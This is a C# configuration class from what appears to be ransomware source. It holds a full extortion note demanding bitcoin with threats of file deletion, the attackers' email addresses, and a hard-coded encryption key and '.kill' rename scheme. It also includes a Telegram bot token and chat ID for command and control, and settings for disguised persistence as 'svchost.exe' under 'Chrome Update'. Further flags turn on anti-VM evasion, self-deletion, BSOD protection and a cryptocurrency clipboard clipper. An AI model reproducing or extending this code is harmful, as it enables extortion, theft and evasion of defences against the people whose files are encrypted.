namespace TSVT26;

internal sealed class Config
{
	public const string email1 = "crypter@firemail.de";

	public const string email2 = "crypter1help@cyberfear.com";

	public static string EncryptPassword = "";

	public const string AESKey = "QWERTYUIOP1234567890ASDFGHJKL1234567890ZXCVBNM1234567890";

	public static string fileRename = "[crypter@firemail.de][" + Help.UniqueID() + "]%FILE%.kill";

	public const string typeOfFile = ".kill";

	public static string fileRSAKey = "RSA." + Help.UniqueID() + ".kill";

	public const string droppedMessageTextbox = "#FILES-ENCRYPTED.txt";

	public const string nameEncrypted = "ENCRYPTED";

	public static string[] messages = new string[50]
	{
		"!!!All of your files are encrypted!!!",
		"To decrypt them send e-mail to this address: crypter@firemail.de",
		"In case of no answer in 24h, send e-mail to this address: crypter1help@cyberfear.com",
		"Your System ID : " + Help.UniqueID(),
		"!!!Deleting \"RSA." + Help.UniqueID() + ".kill\" causes permanent data loss.",
		"",
		"*Pay attention*",
		"",
		"Your system security is very poor, All your files and information are locked.",
		"This is an error on your part We can solve your problem.",
		"But you have to pay us to restore the files.",
		"",
		"$$We set the price according to the economic conditions of your country$$",
		"",
		"Do not worry about the amount, we can agree in any case.",
		"Email us to reach an agreement.",
		"",
		"*The later you send us an email, the more money we will receive* ",
		"",
		"Hurry up if you want unlock files, because the malware will start deleting the files after a while.",
		"Please do not edit the files, you may lose them forever.",
		"",
		"*Pay attention*",
		"",
		"#If files are really important for you.",
		"Send us an email soon.",
		"",
		"$$We consider the economic and financial situation of you and your country and then say the amount$$",
		"",
		"Do not worry, we can reach definitely agree with you.",
		"The payment method is bitcoin.",
		"If you do not trust us we can prove that we can restore the files To do this, send us a file of less than five megabytes Until we restore it Until you trust us.",
		"",
		"+read carefully:",
		"",
		"#Do not edit files You may lose them forever.",
		"",
		"#Do not worry about the amount, we can reach an agreement.",
		"",
		"#The payment method is bitcoin.",
		"",
		"#Send us 3 files if you want to make sure we can restore your files.",
		"",
		"+Ways to contact us:",
		"",
		"Our Email:",
		"crypter@firemail.de",
		"crypter1help@cyberfear.com",
		"",
		"Your System ID: " + Help.UniqueID()
	};

	public const string TelegramToken = "5452662471:AAEhh-hdszOf7jpRwk9AS3FSkpz1oYE7UP0";

	public const string TelegramChatID = "-1001661718224";

	public static int TelegramCommandCheckDelay = 1;

	public static bool AdminRightsRequired = true;

	public static bool AttributeHiddenEnabled = true;

	public static bool AttributeSystemEnabled = true;

	public static bool MeltFilCylanceterStart = true;

	public static string InstallPath = "C:\\Users\\Cylance\\svchost.exe";

	public static string OtherFilePath = "C:\\Users\\Cylance";

	public static bool AutorunEnabled = true;

	public static string AutorunName = "Chrome Update";

	public static bool ProcessBSODProtectionEnabled = true;

	public static bool HideConsoleWindow = true;

	public static bool PreventStartOnVirtualMachine = true;

	public static int StartDelay = 0;

	public static bool BlockNetworkActivityWhenProcessStarted = true;

	public static string[] validExtensions = new string[1] { ".kill" };

	public static bool AutoStealerEnabled = false;

	public static bool ClipperEnabled = true;
}
